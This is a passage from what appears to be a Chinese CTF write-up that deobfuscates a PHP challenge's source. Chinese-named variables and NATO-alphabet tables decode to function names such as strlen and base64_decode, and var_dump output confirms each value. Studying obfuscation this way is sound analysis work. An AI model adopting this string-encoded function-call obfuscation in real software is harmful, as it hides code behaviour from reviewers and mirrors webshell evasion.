class="string">&quot;祖鲁&quot;</span>);</span><br><span class="line">        $实物长度 = 点灯(<span class="keyword">array</span>(<span class="string">&quot;回声&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;狐步舞&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;三角洲&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;高尔夫球&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;爸爸&quot;</span>, <span class="string">&quot;旅馆&quot;</span>));</span><br><span class="line">        $寻根 = 点灯(<span class="keyword">array</span>(<span class="string">&quot;回声&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;狐步舞&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;三角洲&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;喝彩&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;魁北克&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;回声&quot;</span>, <span class="string">&quot;印度&quot;</span>));</span><br><span class="line">        $奇语切片 = 点灯(<span class="keyword">array</span>(<span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;利马&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;威士忌&quot;</span>, <span class="string">&quot;麦克&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;探戈&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;魁北克&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;利马&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>));</span><br><span class="line">        $出窍 = 点灯(<span class="keyword">array</span>(<span class="string">&quot;印度&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;魁北克&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;威士忌&quot;</span>, <span class="string">&quot;麦克&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;威士忌&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>));</span><br><span class="line">        $遮天之术 = 点灯(<span class="keyword">array</span>(<span class="string">&quot;高尔夫球&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;狐步舞&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;利马&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;探戈&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;探戈&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;公斤&quot;</span>));</span><br><span class="line">        $虚空之数 = count(<span class="keyword">$this</span>-&gt;大宇) - count(<span class="keyword">$this</span>-&gt;大宇);<span class="comment">//</span></span><br><span class="line">        $实打实在 = count(<span class="keyword">$this</span>-&gt;大宇) == count(<span class="keyword">$this</span>-&gt;酉戊) / <span class="number">5</span> * (<span class="number">11</span> + <span class="number">1</span> + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        $虚无缥缈 = count(<span class="keyword">$this</span>-&gt;大宇) == (count($天书) + <span class="number">5</span>) / <span class="number">3</span> * (<span class="number">2</span> + <span class="number">1</span> + <span class="number">13</span>);</span><br><span class="line">        $异闻录 = chr(<span class="keyword">$this</span>-&gt;太古仓(<span class="string">&quot;春&quot;</span>)) . chr(<span class="keyword">$this</span>-&gt;太古仓(<span class="string">&quot;铃&quot;</span>));<span class="comment">//</span></span><br><span class="line">        <span class="keyword">for</span> ($爆裂 = count(<span class="keyword">$this</span>-&gt;大宇) - <span class="number">1</span>; $爆裂 &lt; count(<span class="keyword">$this</span>-&gt;大宇) + count(<span class="keyword">$this</span>-&gt;丙午); $爆裂++) &#123; <span class="comment">///count($this-&gt;丙午) = 25</span></span><br><span class="line">            $异闻录 .= chr($爆裂);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ($爆裂 = count(<span class="keyword">$this</span>-&gt;大宇) / (<span class="number">2</span> + <span class="number">1</span>) + count(<span class="keyword">$this</span>-&gt;酉午) * (<span class="number">2</span> + <span class="number">1</span>); $爆裂 &lt; count(<span class="keyword">$this</span>-&gt;支壬) * <span class="number">5</span> - <span class="number">2</span>; $爆裂++) &#123;</span><br><span class="line">            $异闻录 .= chr($爆裂);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ($爆裂 = (count(<span class="keyword">$this</span>-&gt;庚地) + count(<span class="keyword">$this</span>-&gt;大宇)) / <span class="number">2</span> + <span class="number">1</span>; $爆裂 &lt; count(<span class="keyword">$this</span>-&gt;大宇) - count(<span class="keyword">$this</span>-&gt;辰寅) / (<span class="number">2</span> + <span class="number">1</span>); $爆裂++) &#123;</span><br><span class="line">            $异闻录 .= chr($爆裂);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> 点灯(<span class="params">$俚语</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $天书, $虚物长度, $虚空之数, $原;</span><br><span class="line">    $偏离 = count($俚语) % <span class="number">11</span>;</span><br><span class="line">    $简易之物 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($简易种子 = $虚空之数; $简易种子 &lt; count($俚语) / (<span class="number">1</span> + <span class="number">1</span>); $简易种子++) &#123;</span><br><span class="line">        $贾 = $虚空之数;</span><br><span class="line">        <span class="keyword">for</span> ($另类种子 = $偏离; $另类种子 &lt; $偏离 + <span class="number">11</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">1</span>; $另类种子++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($天书[$另类种子] == $俚语[$简易种子 + $简易种子]) &#123;</span><br><span class="line">                $贾 += $另类种子;</span><br><span class="line">                $贾 -= $偏离;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($天书[$另类种子] == $俚语[$简易种子 + $简易种子 + <span class="number">1</span>]) &#123;</span><br><span class="line">                $贾 += $另类种子 * <span class="number">2</span> * <span class="number">2</span> * <span class="number">2</span> * <span class="number">2</span>;</span><br><span class="line">                $贾 -= $偏离 * <span class="number">2</span> * <span class="number">2</span> * <span class="number">2</span> * <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $简易之物 .= chr($贾);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $简易之物;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_var_name</span>(<span class="params">$var</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($GLOBALS <span class="keyword">as</span> $var_name =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($value === $var) &#123;</span><br><span class="line">            <span class="keyword">return</span> $var_name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$原 = <span class="string">&quot;chr&quot;</span>;</span><br><span class="line">$虚物长度 = <span class="string">&quot;count&quot;</span>;</span><br><span class="line">$随缘 = <span class="string">&quot;rand&quot;</span>;</span><br><span class="line">$千奇百出 = <span class="string">&quot;余壶血史两恐自扩劫盏铁天&quot;</span>;</span><br><span class="line">$来者无惧 = <span class="string">&quot;余壶仍灯两恐尽天&quot;</span>;</span><br><span class="line">$虚空之数 = <span class="number">0</span>;</span><br><span class="line">$fe1w0 = <span class="keyword">new</span> 造化之神;</span><br><span class="line">$arr = <span class="keyword">array</span>($天书, $原, $虚物长度, $异闻录, $实物长度, $寻根, $奇语切片, $出窍, $遮天之术, $虚空之数, $实打实在, $虚无缥缈);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($arr);$i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> print_var_name($arr[$i]).<span class="string">&quot; :&quot;</span>.$arr[$i].PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$天书=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">26</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;阿尔法&quot;</span></span><br><span class="line">  [<span class="number">1</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;喝彩&quot;</span></span><br><span class="line">  [<span class="number">2</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;查理&quot;</span></span><br><span class="line">  [<span class="number">3</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;三角洲&quot;</span></span><br><span class="line">  [<span class="number">4</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;回声&quot;</span></span><br><span class="line">  [<span class="number">5</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;狐步舞&quot;</span></span><br><span class="line">  [<span class="number">6</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;高尔夫球&quot;</span></span><br><span class="line">  [<span class="number">7</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;旅馆&quot;</span></span><br><span class="line">  [<span class="number">8</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;印度&quot;</span></span><br><span class="line">  [<span class="number">9</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;朱丽叶&quot;</span></span><br><span class="line">  [<span class="number">10</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;公斤&quot;</span></span><br><span class="line">  [<span class="number">11</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;利马&quot;</span></span><br><span class="line">  [<span class="number">12</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;麦克&quot;</span></span><br><span class="line">  [<span class="number">13</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;十一月&quot;</span></span><br><span class="line">  [<span class="number">14</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;奥斯卡&quot;</span></span><br><span class="line">  [<span class="number">15</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;爸爸&quot;</span></span><br><span class="line">  [<span class="number">16</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;魁北克&quot;</span></span><br><span class="line">  [<span class="number">17</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;罗密欧&quot;</span></span><br><span class="line">  [<span class="number">18</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;塞拉&quot;</span></span><br><span class="line">  [<span class="number">19</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;探戈&quot;</span></span><br><span class="line">  [<span class="number">20</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;制服&quot;</span></span><br><span class="line">  [<span class="number">21</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;胜利者&quot;</span></span><br><span class="line">  [<span class="number">22</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;威士忌&quot;</span></span><br><span class="line">  [<span class="number">23</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;伦琴射线&quot;</span></span><br><span class="line">  [<span class="number">24</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;扬基&quot;</span></span><br><span class="line">  [<span class="number">25</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;祖鲁&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">$原=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;chr&quot;</span></span><br><span class="line">$虚物长度=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;count&quot;</span></span><br><span class="line">$异闻录=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">66</span>) <span class="string">&quot;+=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz./0123456789&quot;</span></span><br><span class="line">$实物长度=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;strlen&quot;</span></span><br><span class="line">$寻根=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;strpos&quot;</span></span><br><span class="line">$奇语切片=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;str_split&quot;</span></span><br><span class="line">$出窍=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;array_pop&quot;</span></span><br><span class="line">$遮天之术=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;base64_decode&quot;</span></span><br><span class="line">$虚空之数=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line">$实打实在=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line">$虚无缥缈=</span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">232</span>:</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>双手造物</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 双手造物(<span class="params">$物, $左手, $右手</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    造化($物)(造化($左手), 造化($右手));</span><br><span class="line">    var_dump(造化($物));</span><br><span class="line">    var_dump(造化($左手));</span><br><span class="line">    var_dump(造化($右手));</span><br><span class="line">&#125;</span><br><span class="line">双手造物(<span class="string">&quot;诊秀倾垫余监血泡披切天夫&quot;</span>, <span class="string">&quot;沃乎泡误拢瓜迷物构吨悔沿抹孟扩逃规承舌天&quot;</span>, <span class="string">&quot;劫哥沃实&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">247</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;ini_set&quot;</span></span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">248</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;display_errors&quot;</span></span><br><span class="line">/home/fe1w0/babyshop/tttttt.php:<span class="number">249</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;Off&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>造化与 使用<code>造化</code>函数混淆的参数</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 造化(<span class="params">$奇语</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $异闻录, $奇语切片, $虚物长度, $出窍, $虚空之数, $虚无缥缈, $遮天之术,$fe1w0;</span><br><span class="line">    $fe1w0 = $奇语;</span><br><span class="line">    $奇语 = str_split($奇语, <span class="number">2</span> + <span class="number">1</span>);<span class="comment">//从第4个开始拆开</span></span><br><span class="line">    $造化之子 = <span class="keyword">new</span> 造化之神();</span><br><span class="line">    $翻译果实 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($翻译种子 = $虚空之数; $翻译种子 &lt; $虚物长度($奇语); $翻译种子++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($造化种子 = $虚空之数; $造化种子 &lt; $虚物长度($造化之子-&gt;大宇); $造化种子++) &#123;</span><br><span class="line">            $造化之孙 = $造化之子-&gt;大宇[$造化种子];</span><br><span class="line">            $造化之孙长度 = $虚物长度($造化之孙);</span><br><span class="line">            <span class="keyword">if</span> ($造化之孙长度 == $虚空之数) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($造化之孙[$造化之孙长度 - <span class="number">1</span>] == $奇语[$翻译种子]) &#123;</span><br><span class="line">                $翻译果实 .= $异闻录[$造化种子];</span><br><span class="line">                array_pop($造化之子-&gt;大宇[$造化种子]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">echo</span> print_var_name($fe1w0).<span class="string">&quot;:&quot;</span>.base64_decode($翻译果实);</span><br><span class="line">    <span class="keyword">return</span> base64_decode($翻译果实);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后的混淆基本上全是用<code>造化</code>来混淆,可以将混淆的变量名和变量值一同打印分析。</p>
<blockquote>
<p>参考的E99p1ant 师傅</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#session_save_path(&#x27;/var/www/html/babycode/storage&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 造化之神 </span>&#123;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;融合();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> 融合(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $天书,$异闻录,$实物长度,$寻根,$奇语切片,$出窍,$遮天之术,$虚空之数, $实打实在,$虚无缥缈;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $虚空之数 = NULL</span></span><br><span class="line"></span><br><span class="line">        $天书=<span class="keyword">array</span>(<span class="string">&quot;阿尔法&quot;</span>,<span class="string">&quot;喝彩&quot;</span>,<span class="string">&quot;查理&quot;</span>,<span class="string">&quot;三角洲&quot;</span>,<span class="string">&quot;回声&quot;</span>,<span class="string">&quot;狐步舞&quot;</span>,<span class="string">&quot;高尔夫球&quot;</span>,<span class="string">&quot;旅馆&quot;</span>,<span class="string">&quot;印度&quot;</span>,<span class="string">&quot;朱丽叶&quot;</span>,<span class="string">&quot;公斤&quot;</span>,<span class="string">&quot;利马&quot;</span>,<span class="string">&quot;麦克&quot;</span>,<span class="string">&quot;十一月&quot;</span>,<span class="string">&quot;奥斯卡&quot;</span>,<span class="string">&quot;爸爸&quot;</span>,<span class="string">&quot;魁北克&quot;</span>,<span class="string">&quot;罗密欧&quot;</span>,<span class="string">&quot;塞拉&quot;</span>,<span class="string">&quot;探戈&quot;</span>,<span class="string">&quot;制服&quot;</span>,<span class="string">&quot;胜利者&quot;</span>,<span class="string">&quot;威士忌&quot;</span>,<span class="string">&quot;伦琴射线&quot;</span>,<span class="string">&quot;扬基&quot;</span>,<span class="string">&quot;祖鲁&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $实物长度=<span class="string">&#x27;strlen&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        $寻根=<span class="string">&#x27;strpos&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        $奇语切片=<span class="string">&#x27;str_split&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        $出窍=<span class="string">&#x27;array_pop&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        $遮天之术=<span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        $虚空之数=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        $实打实在 = <span class="literal">true</span>;</span><br><span class="line">        $虚无缥缈 = <span class="literal">false</span>;</span><br><span class="line">        $异闻录= <span class="string">&#x27;+=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz./0123456789&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面是加密的构造函数，可以不管</span></span><br><span class="line"><span class="keyword">new</span> 造化之神();</span><br><span class="line"></span><br><span class="line">$千奇百出=<span class="string">&quot;余壶血史两恐自扩劫盏铁天&quot;</span>;</span><br><span class="line"></span><br><span class="line">$来者无惧=<span class="string">&quot;余壶仍灯两恐尽天&quot;</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$宝物=<span class="string">&quot;冻实史畏言秀倾服沃尽天夫&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 造齿轮 </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>$朝拜圣地;</span><br><span class="line">    <span class="keyword">protected</span>$贡品;</span><br><span class="line">    <span class="keyword">protected</span>$圣殿;</span><br><span class="line">    <span class="keyword">protected</span>$禁地;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 